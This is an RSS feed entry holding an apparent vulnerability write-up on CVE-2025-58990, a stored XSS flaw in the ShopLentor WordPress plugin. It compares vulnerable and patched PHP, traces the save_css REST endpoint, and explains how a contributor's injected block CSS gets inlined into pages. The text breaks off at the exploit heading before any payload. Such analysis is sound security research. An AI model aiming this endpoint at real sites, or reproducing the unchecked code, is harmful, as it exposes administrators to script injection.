      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;A vulnerability in the &lt;strong&gt;ShopLentor&lt;/strong&gt; plugin prior to version &lt;strong&gt;3.2.0&lt;/strong&gt; allows an attacker with &lt;strong&gt;contributor&lt;/strong&gt; privileges to inject malicious code into a block&amp;rsquo;s CSS. This CSS is then loaded inline into the page and can lead to Stored XSS when previewed or rendered in a browser.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58990&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58990&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woolentor-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ShopLentor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;ShopLentor&lt;/strong&gt;: v3.2.0 (vulnerable) and v3.2.1 (fixed)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool capable of comparing the two versions to see differences&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Activated WooCommerce plugin&lt;/strong&gt;: WooCommerce must be &lt;strong&gt;activated&lt;/strong&gt; before installing the &lt;strong&gt;ShopLentor Plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare differences between the vulnerable and fixed versions.&#xA;The notable difference is in the file &lt;strong&gt;woolentor-blocks/includes/classes/Manage_Styles.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // No user permission check&#xA;    // No sanitization of CSS before saving&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $params[&amp;#39;block_css&amp;#39;] );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $params[&amp;#39;block_css&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Fixed version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // Only admin or the post author are allowed&#xA;    $post = get_post( $post_id );&#xA;    if ( ! $post || ( ! current_user_can(&amp;#39;manage_options&amp;#39;) &amp;amp;&amp;amp;&#xA;        get_current_user_id() !== (int) $post-&amp;gt;post_author ) ) {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;No permission&amp;#39;)];&#xA;    }&#xA;&#xA;    // Sanitize data before saving&#xA;    $block_css = $this-&amp;gt;sanitize_css_content( $params[&amp;#39;block_css&amp;#39;] );&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $block_css );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $block_css );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch uses &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; to check for &lt;strong&gt;admin&lt;/strong&gt; privileges:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If the user is &lt;strong&gt;admin&lt;/strong&gt; =&amp;gt; the first part &lt;code&gt;! current_user_can(&#39;manage_options&#39;) = false&lt;/code&gt; =&amp;gt; the whole &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; expression is false =&amp;gt; passes.&lt;/li&gt;&#xA;&lt;li&gt;If the user is the &lt;strong&gt;author&lt;/strong&gt; =&amp;gt; the latter part &lt;code&gt;get_current_user_id() !== (int) $post-&amp;gt;post_author = false&lt;/code&gt; =&amp;gt; the whole &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; expression is false =&amp;gt; passes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/patch_diff.png&#34; title=&#34;Patch Diff&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch Diff&lt;/h2&gt;&lt;p&gt;Patch Diff&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/patch_diff.png&#39; alt=&#34;Patch Diff&#34; height=&#34;809&#34; width=&#34;1780&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch Diff&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How It Works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    try{&#xA;        global $wp_filesystem;&#xA;        if ( ! $wp_filesystem || !function_exists(&amp;#39;WP_Filesystem&amp;#39;) ) {&#xA;            require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;        }&#xA;&#xA;        $params &#x9;= $request-&amp;gt;get_params();&#xA;        $post_id &#x9;= sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;        &#xA;        if ( $post_id == &amp;#39;woolentor-widget&amp;#39; &amp;amp;&amp;amp; $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_option( $post_id, $params[&amp;#39;block_css&amp;#39;] );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true, &#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Widget CSS Saved.&amp;#39;, &amp;#39;woolentor&amp;#39;)&#xA;            ];&#xA;        }&#xA;&#xA;        $filename &#x9;&#x9;= &amp;#34;woolentor-css-{$post_id}.css&amp;#34;;&#xA;        $upload_dir_url = wp_upload_dir();&#xA;        $dirname &#x9;&#x9;= trailingslashit( $upload_dir_url[&amp;#39;basedir&amp;#39;] ) . &amp;#39;woolentor-addons/&amp;#39;;&#xA;&#xA;        if ( $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;            $all_block_css = $params[&amp;#39;block_css&amp;#39;];&#xA;&#xA;            WP_Filesystem( false, $upload_dir_url[&amp;#39;basedir&amp;#39;], true );&#xA;            if( ! $wp_filesystem-&amp;gt;is_dir( $dirname ) ) {&#xA;                $wp_filesystem-&amp;gt;mkdir( $dirname );&#xA;            }&#xA;&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $all_block_css );&#xA;            if ( ! $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $all_block_css ) ) {&#xA;                throw new \Exception( __(&amp;#39;You are not permitted to save CSS.&amp;#39;, &amp;#39;woolentor&amp;#39; ) ); &#xA;            }&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt;__(&amp;#39;WooLentor Blocks css file update.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        } else {&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39; );&#xA;            if ( file_exists( $dirname.$filename ) ) {&#xA;                wp_delete_file( $dirname.$filename );&#xA;            }&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39; );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;WooLentor Blocks CSS Delete.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        }&#xA;    } catch( \Exception $e ){&#xA;        return [&#xA;            &amp;#39;success&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage()&#xA;        ];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;save_block_css()&lt;/code&gt; function in the &lt;code&gt;Manage_Styles&lt;/code&gt; class is responsible for saving or deleting the block CSS.&lt;/p&gt;&#xA;&lt;p&gt;The application retrieves &lt;code&gt;post_id&lt;/code&gt; and &lt;code&gt;block_css&lt;/code&gt; from the request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Special case&lt;/strong&gt;: if &lt;code&gt;post_id == &#39;woolentor-widget&#39;&lt;/code&gt; =&amp;gt; the CSS is saved to &lt;code&gt;wp_options&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Normal post case&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If there is a block (&lt;code&gt;has_block = true&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mark the post as active (&lt;code&gt;_woolentor_active&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Save the CSS into the &lt;code&gt;wp_postmeta&lt;/code&gt; table with &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_postmeta where meta_key=&amp;#39;_woolentor_css&amp;#39;;&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;| meta_id | post_id | meta_key       | meta_value |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;|      27 |      69 | _woolentor_css | body:{}    |&#xA;|     687 |    1416 | _woolentor_css | body:{}    |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Write the CSS file into the uploads directory (&lt;code&gt;woolentor-css-{post_id}.css&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/write_css.png&#34; title=&#34;Write CSS&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/write_css.png&#34; data-sub-html=&#34;&lt;h2&gt;Write CSS&lt;/h2&gt;&lt;p&gt;Write CSS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/write_css.png&#39; alt=&#34;Write CSS&#34; height=&#34;322&#34; width=&#34;976&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Write CSS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If there is no block (&lt;code&gt;has_block = false&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Remove the active flag and CSS meta.&lt;/li&gt;&#xA;&lt;li&gt;Delete the CSS file if it exists.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 The likely attack scenario is a typical &lt;strong&gt;Stored XSS&lt;/strong&gt;: a user with role &lt;strong&gt;contributor&lt;/strong&gt; (who cannot publish) creates a post and injects an XSS payload into the block CSS. The payload is stored in the &lt;strong&gt;database&lt;/strong&gt; or a &lt;strong&gt;file&lt;/strong&gt;; a higher-privileged user previews the content before publishing, the payload is loaded/rendered in the browser and executes, causing XSS.&lt;/p&gt;&#xA;&lt;p&gt;To understand how the data is rendered, search the plugin for &lt;code&gt;_woolentor_css&lt;/code&gt;. Since CSS is stored in &lt;code&gt;wp_postmeta&lt;/code&gt; under the &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt;, the plugin will query this value and insert it directly into HTML.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/meta_key.png&#34; title=&#34;Search Meta Key&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/meta_key.png&#34; data-sub-html=&#34;&lt;h2&gt;Search Meta Key&lt;/h2&gt;&lt;p&gt;Search Meta Key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/meta_key.png&#39; alt=&#34;Search Meta Key&#34; height=&#34;762&#34; width=&#34;1588&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search Meta Key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;generate_inline_css()&lt;/code&gt; fetches block CSS from &lt;strong&gt;wp_postmeta&lt;/strong&gt; with &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt; and from the file &lt;code&gt;woolentor-css-{$post_id}.css&lt;/code&gt; — if the file exists it calls &lt;code&gt;get_contents&lt;/code&gt; and inlines the CSS for the post with the given &lt;code&gt;$post_id&lt;/code&gt;; otherwise it falls back to &lt;strong&gt;wp_postmeta&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The content is placed inside a &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt; tag.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;Manage_Styles&lt;/code&gt; class registers a &lt;strong&gt;REST API&lt;/strong&gt; route in the &lt;code&gt;register_routes&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes( $namespace ){&#xA;    register_rest_route( $namespace, &amp;#39;save_css&amp;#39;,&#xA;        [&#xA;            [&#xA;                &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;, &#xA;                &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;save_block_css&amp;#39; ],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;permission_check&amp;#39; ],&#xA;                &amp;#39;args&amp;#39; =&amp;gt; []&#xA;            ]&#xA;        ]&#xA;    );&#xA;    // other route&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;register_rest_route()&lt;/code&gt; creates a &lt;strong&gt;REST API&lt;/strong&gt; endpoint at:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/{namespace}/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a &lt;strong&gt;POST&lt;/strong&gt; request is made to this endpoint:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;WordPress calls &lt;code&gt;save_block_css()&lt;/code&gt; to handle the data.&lt;/li&gt;&#xA;&lt;li&gt;Before that, &lt;code&gt;permission_callback&lt;/code&gt; runs &lt;code&gt;permission_check()&lt;/code&gt; to verify user permissions (if it returns false, the request is denied).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function permission_check() {&#xA;    if( current_user_can( &amp;#39;edit_posts&amp;#39; ) ){&#xA;        return true;&#xA;    }else{&#xA;        return false;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_check&lt;/code&gt; specifies that only users with at least &lt;strong&gt;contributor&lt;/strong&gt; privileges can use this API.&lt;/p&gt;&#xA;&lt;p&gt;We haven&amp;rsquo;t identified the exact &lt;strong&gt;namespace&lt;/strong&gt; here because it is declared elsewhere in the source. We trace using the &lt;code&gt;save_css&lt;/code&gt; route.&lt;/p&gt;&#xA;&lt;p&gt;Access &lt;code&gt;/wp-json/&lt;/code&gt; and search for &lt;code&gt;save_css&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/search.png&#34; title=&#34;Search&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/search.png&#39; alt=&#34;Search&#34; height=&#34;451&#34; width=&#34;1557&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The results show the actual endpoint:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To find where this &lt;strong&gt;namespace&lt;/strong&gt; is declared, search the source for &lt;code&gt;&#39;woolentor/v1&#39;&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/name_space.png&#34; title=&#34;Name Space&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/name_space.png&#34; data-sub-html=&#34;&lt;h2&gt;Name Space&lt;/h2&gt;&lt;p&gt;Name Space&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/name_space.png&#39; alt=&#34;Name Space&#34; height=&#34;423&#34; width=&#34;895&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Name Space&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;There are multiple results, but since we&amp;rsquo;re analyzing the &lt;strong&gt;REST API&lt;/strong&gt; feature, focus on the &lt;strong&gt;Api.php&lt;/strong&gt; file.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;register_routes( $namespace )&lt;/code&gt; in &lt;code&gt;Manage_Styles&lt;/code&gt; requires the &lt;code&gt;$namespace&lt;/code&gt; parameter, so &lt;code&gt;woolentor/v1&lt;/code&gt; is likely passed in by the class instantiation in Api.php. Search for &lt;code&gt;Manage_Styles&lt;/code&gt; in Api.php to confirm.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/callapi.png&#34; title=&#34;Call Api&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/callapi.png&#34; data-sub-html=&#34;&lt;h2&gt;Call Api&lt;/h2&gt;&lt;p&gt;Call Api&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/callapi.png&#39; alt=&#34;Call Api&#34; height=&#34;337&#34; width=&#34;1509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Call Api&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The namespace is indeed called and passed that way.&lt;/p&gt;&#xA;&lt;p&gt;👉 Therefore, sending a &lt;strong&gt;POST&lt;/strong&gt; to &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt; will invoke the &lt;code&gt;save_block_css&lt;/code&gt; callback to add/update block CSS in the file and database. When visiting a post whose &lt;code&gt;post_id&lt;/code&gt; has saved block CSS, &lt;code&gt;generate_inline_css&lt;/code&gt; will retrieve the block CSS and inline it inside a &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt; tag in the post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 